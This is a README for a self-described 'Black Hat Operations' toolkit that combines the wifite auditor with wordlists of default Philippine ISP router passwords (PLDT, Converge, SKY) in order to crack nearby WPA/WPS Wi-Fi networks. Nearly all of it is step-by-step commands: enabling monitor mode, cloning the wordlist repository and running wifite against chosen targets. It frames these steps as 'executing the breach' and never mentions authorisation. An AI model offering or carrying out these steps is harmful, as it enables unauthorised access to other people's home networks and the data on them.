## ‚ö´Ô∏è Overview: Black Hat Operations

This toolkit integrates the powerful `wifite` automated wireless auditor with a curated wordlist specifically targeting default router passwords commonly found in the Philippines (`jcrvnx/PH-WIFI-WORDLISTS`). It's designed for Kali Linux but adaptable to any Linux distribution with the right hardware and dependencies.

We provide the framework; you execute the breach. This README includes setup instructions, usage patterns, and essential documentation for leveraging these tools effectively.

## ‚ú® Features

*   **üéØ Targeted Attack:** Utilizes a massive wordlist focused on PH ISP default credentials.
*   **‚öôÔ∏è Automated Auditing:** Leverages `wifite` for scanning, target selection, and attack execution (WPS, WPA/WPA2 Handshake Capture & Cracking).
*   **üêß Broad Linux Compatibility:** Optimized for Kali Linux, but functional on Ubuntu, Debian, Arch, and other distros (dependencies required).
*   **üìö Clear Documentation:** Step-by-step guidance for setup and execution.
*   **üí∞ Support the Cause:** Donation options available to fuel further development and tool acquisition.

## üõ†Ô∏è Setup & Installation (Kali Linux Focus)

**Mandatory on any Linux Distro:**

1.  **Update & Upgrade System:** Keep your attack platform sharp.
    ```bash
    sudo apt update && sudo apt upgrade -y
    # Or use your distro's package manager (e.g., pacman, dnf)
    ```

2.  **Install Dependencies:** `wifite` and `git` are essential.
    ```bash
    sudo apt install wifite git -y
    # Ensure aircrack-ng suite, hashcat/john are also installed (usually come with Kali/wifite)
    ```

3.  **Wireless Adapter Check:** Your WiFi card MUST support **Monitor Mode** and **Packet Injection**. Verify using:
    ```bash
    sudo airmon-ng check kill # Kill interfering processes
    sudo airmon-ng start <your-wireless-interface> # e.g., wlan0
    # Look for "(monitor mode enabled)"
    # If issues arise, consult Kali documentation for driver installation.
    ```

4.  **Clone the PH Wordlist Repository:** Get the ammunition.
    ```bash
    git clone https://github.com/jcrvnx/PH-WIFI-WORDLISTS.git
    cd PH-WIFI-WORDLISTS
    echo "Wordlists downloaded to $(pwd)"
    ```
    *Note the directory where the wordlists are stored. You'll need this path.*

## üöÄ Execution: Running Wifite with PH Wordlists

1.  **Navigate (Optional):** You don't *need* to be in the wordlist directory to run `wifite`, but know the *full path* to the wordlist file you want to use.

2.  **Launch Wifite with the Dictionary:**
    *   Identify the *specific* wordlist file you want to use within the cloned `PH-WIFI-WORDLISTS` directory (e.g., `Passwords/PLDT-WIFI-PASSWORDS.txt`, `Passwords/Converge-WIFI-PASSWORDS.txt`, etc.).
    *   Run `wifite` with `sudo` (required for network operations) and point it to your chosen dictionary using the `--dict` flag.

    ```bash
    # Example using the PLDT common password list:
    # Replace '/path/to/PH-WIFI-WORDLISTS/' with the actual path where you cloned the repo.
    sudo wifite --dict /path/to/PH-WIFI-WORDLISTS/Passwords/PLDT-WIFI-PASSWORDS.txt

    # Example using a different list:
    # sudo wifite --dict /path/to/PH-WIFI-WORDLISTS/Passwords/SKY-WIFI-PASSWORDS.txt

    # To try ALL wordlists in sequence (less efficient, wifite might not support multiple dicts easily this way, better to run separately or combine lists):
    # Consider combining relevant lists into one large file first if needed.
    # cat /path/to/PH-WIFI-WORDLISTS/Passwords/*.txt > /path/to/combined_ph_list.txt
    # sudo wifite --dict /path/to/combined_ph_list.txt
    ```

3.  **Follow Wifite Prompts:**
    *   `wifite` will scan for networks.
    *   Press `Ctrl+C` when you see your target(s).
    *   Select the target network number(s).
    *   `wifite` will attempt various attacks (WPS PIN, WPA Handshake Capture).
    *   If a WPA handshake is captured, `wifite` will automatically use the specified dictionary (`--dict`) to attempt cracking the password.
